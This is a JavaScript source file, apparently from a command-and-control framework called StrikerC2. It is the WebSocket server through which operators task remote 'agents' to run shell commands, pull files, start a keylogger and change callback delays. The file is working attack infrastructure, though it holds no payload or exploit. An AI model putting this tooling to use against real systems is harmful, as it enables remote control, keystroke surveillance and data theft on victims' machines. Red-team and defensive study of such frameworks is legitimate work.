/**
 * @file The server side Web Sockets (WS) implementation.
 * @author Umar Abdul
 */

import {Server} from 'socket.io';
import User, * as userModel from '../models/user.js';
import Key, * as keyModel from '../models/key.js';
import Agent, * as agentModel from '../models/agent.js';
import Task, * as taskModel from '../models/task.js';
import File, * as fileModel from '../models/file.js';
import Chat, * as chatModel from '../models/chat.js';
import {output} from './utils.js';

/**
 * Configure the web socket server and create event listeners.
 * @param {object} httpServer - The HTTP server object returned by Express.
 */
export const setupWS = (httpServer) => {

  // Create the socket server and make it global (we will be needing it in other files).
  global.socketServer = new Server(httpServer, {
    cors: {
      origin: global.ORIGIN_URL,
      methods: ["GET", "POST"]
    }
  });

  global.socketObjects = {}; // Maps usernames to connected socket objects.
  global.adminSocketObjects = {}; // For admin users only.
  global.serverPrompt = "[StrikerC2] > "; // The console prompt to use for server output.
  const users = {}; // Maps connected socket IDs to usernames.

  /**
   * Emit a WS event to all admin users.
   * @param {string} name - The event name.
   * @param {object} data - The event data.
   */
  global.adminWSEmit = async (name, data) => {

    for (let username in adminSocketObjects)
      adminSocketObjects[username].emit(name, data);
  };

  // Define an auth middleware.
  socketServer.use((socket, next) => {

    const token = socket.handshake.auth.token;
    if (!token)
      return next(new Error("Access denied!"));
    // Authenticate.
    userModel.getUserByToken(token).then(user => {
      users[socket.id] = user.username;
      next();
    }).catch(error => {
      return next(new Error("Access denied!"));
    });
  });

  // Handle connections.
  socketServer.on('connection', async (client) => {

    const serverPrompt = global.serverPrompt;
    const username = users[client.id];
    const user = await User.findOne({username});
    if (user.admin)
      adminSocketObjects[username] = client;
    socketObjects[username] = client;
    output(`WS: New connection for '${username}': ${client.id}`);

    // Console help page.
    const helpPage = "  COMMAND                FUNCTION\n"+
                     "  -------                --------\n\n"+
                     "  abort                  Task agent to quit\n"+
                     "  clear                  Clear console output\n"+
                     "  cd <dir>               Change working directory\n"+
                     "  delay <secs>           Update agent callback delay\n"+
                     "  delete agent           Delete agent\n"+
                     "  delete task <id>       Delete a task\n"+
                     "  download <file>        Download a file from the agent\n"+
                     "  freeze                 Freeze/stop agent from receiving tasks\n"+
                     "  help/?                 You are looking at it :p\n"+
                     "  unfreeze               Unfreeze agent\n"+
                     "  keymon <secs>          Run a keylogger for given amount of seconds\n"+
                     "  system <cmd>           Run a shell command on the agent\n"+
                     "  writedir <dir>         Change the write directory of an agent\n";

    /**
     * For processing raw agent console inputs from users. 
     * Note that some inputs are handled completely in the client side.
     * Both input and results are broadcasted to all connected users.
     */
    client.on("agent_console_input", (data) => {

      try{
        const agent = data.agent;
        const agentID = agent.uid.toString();
        const input = data.input.toString().trim();
        client.emit("agent_console_output", {
          agentID,
          msg: `${username} > ${input}`
        });
        if (input === "help" || input === "?"){
          client.emit("agent_console_output", {
            agentID,
            msg: helpPage
          });
        }else if (input.startsWith("system ")){ // Create a system command task
          let cmd = input.substr(7).trim();
          const taskData = {
            agentID,
            taskType: "system",
            data: {
              cmd
            }
          };
          taskModel.createTask(username, taskData).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input === "freeze"){ // Freeze an agent.
          agentModel.freezeAgent(agentID, username).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input === "unfreeze"){ // Unfreeze an agent.
          agentModel.unfreezeAgent(agentID, username).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input.startsWith("delete task ")){ // Delete a task.
          let taskID = input.substr(12).trim();
          taskModel.deleteTask(agentID, taskID, username).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input === "delete agent"){ // Delete the agent.
          agentModel.deleteAgent(agentID, username).then(async () => {
            await taskModel.deleteAllTasks(agentID);
            await fileModel.deleteAllFiles(agentID);
          }).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input.startsWith("download ")){ // Task an agent to upload a file to the server.
          let filename = input.substr(9).trim();
          taskModel.createTask(username, {
            agentID, taskType: "download", data: {file: filename}
          }).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input.startsWith("writedir ")){ // Change the write dir of an agent.
          let dir = input.substr(9).trim();
          taskModel.createTask(username, {
            agentID, taskType: "writedir", data: {dir}
          }).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input.startsWith("keymon ")){ // Start a keylogger.
          let duration = parseInt(input.substr(7).trim());
          taskModel.createTask(username, {
            agentID, taskType: "keymon", data: {duration}
          }).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input.startsWith("delay ")){
          let delay = input.substr(6).trim();
          if (isNaN(delay)){
            client.emit("agent_console_output", {
              agentID,
              msg: serverPrompt + "Invalid callback delay: " + delay
            });
          }else{
            delay = parseInt(delay);
            taskModel.createTask(username, {
              agentID, taskType: "delay", data: {delay}
            }).then(() => {
              agentModel.updateDelay(agentID, delay).catch(error => {
                client.emit("striker_error", error.message);
              });
            }).catch(error => {
              client.emit("striker_error", error.message);
            });
          }
        }else if (input.startsWith("cd ")){
          let dirname = input.substr(3).trim();
          taskModel.createTask(username, {
            agentID, taskType: "cd", data: {dir: dirname}
          }).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input === "abort"){
          taskModel.createTask(username, {
            agentID, taskType: "abort"
          }).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else{ // Unknown query
          client.emit("agent_console_output", {
            agentID,
            msg: serverPrompt + "Unknown command: " + input
          });
        }
      }catch(error){
        console.log(error);
        client.emit("striker_error", error.message);
      }
    });

    // For queuing a prepared task for an agent.
    client.on("create_task", (data) => {
       taskModel.createTask(username, data).catch(error => {
        client.emit("striker_error", error.message);
      });
    });

    // For deleting a task.
    client.on("delete_task", (data) => {

      taskModel.deleteTask(data.agentID, data.taskID, username).catch(error => {
        client.emit("striker_error", error.message);
      });
    });

    // For creating a new team chat message.
    client.on("send_teamchat_message", (message) => {

      if (!message)
        return;
      message = message.toString().trim();
      if (message === "/users"){
        let users = Object.keys(socketObjects).sort();
        let output = "";
        for (let user of users)
          output += `=>  ${user}\n`;
        client.emit("new_teamchat_message", output.trim());
      }else{
        chatModel.createMessage(username, message).catch(error => {
        });
      }
    });

    // Handles client ws disconnect
    client.on("disconnect", () => {

      delete global.socketObjects[username];
      if (global.adminSocketObjects[username])
        delete global.adminSocketObjects[username];
      output(`WS: User '${username}' has disconnect!`);
    });

  });

};
